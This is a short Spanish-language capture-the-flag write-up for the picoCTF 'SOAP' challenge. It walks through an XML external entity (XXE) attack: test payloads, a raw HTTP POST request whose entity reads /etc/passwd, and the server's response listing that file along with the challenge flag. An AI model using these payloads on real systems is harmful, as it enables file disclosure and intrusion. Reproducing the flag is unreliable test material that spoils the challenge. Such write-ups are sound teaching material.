# SOAP
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:56292/)

## Solución
Que es XXE ?
[Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)


### Prueba inicial

- si remplaza, el 1 arriba , va abajo y obtendremos la info
```
[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY tot "3"> ]>
<data><ID>&tot;</ID>
</data>](<%3C?xml version="1.0" encoding="UTF-8"?%3E
<!DOCTYPE replace [<!ENTITY example "1"> ]>
<data><ID>&example;</ID></data>>)
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<data><ID>&test;</ID></data>
```


### Inyeccion

```
POST /data HTTP/1.1
Host: saturn.picoctf.net:56292
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://saturn.picoctf.net:56292/
Content-Type: application/xml
Content-Length: 113
Origin: http://saturn.picoctf.net:56292
Connection: close
Cookie: PHPSESSID=lj3gcm06t7pt9nsbdvqd1uerm6



<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY tot SYSTEM "/etc/passwd"> ]>
<data><ID>&tot;</ID>
</data>
```


```
Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```


```

```